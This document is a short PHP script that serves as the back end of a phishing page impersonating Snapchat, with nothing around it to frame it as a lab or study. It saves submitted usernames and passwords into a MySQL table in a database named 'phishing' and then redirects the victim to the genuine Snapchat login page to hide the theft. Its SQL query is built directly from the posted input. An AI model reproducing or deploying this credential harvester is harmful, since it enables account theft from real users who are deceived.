<?php
$server = "localhost";
$username = "root";
$password = "";
$dbname = "phishing";

$con = mysqli_connect($server, $username, $password, $dbname);

if (!$con) {
    echo "Connection failed";
}

$name = $_POST['username'];
$pass = $_POST['password'];

$sql = "INSERT INTO `snapchat`(`username`, `password`) VALUES ('$name','$pass')";
$result = mysqli_query($con, $sql);
if ($result) {
    header('Location: https://accounts.snapchat.com/accounts/login?continue=%2Faccounts%2Fsso%3Freferrer%3Dhttps%253A%252F%252Fweb.snapchat.com%252F%253Flang%253Den-US%2526ref%253Dweb_hero_login_button%26client_id%3Dweb-calling-corp--prod');
} else {
    echo "Data not inserted";
}
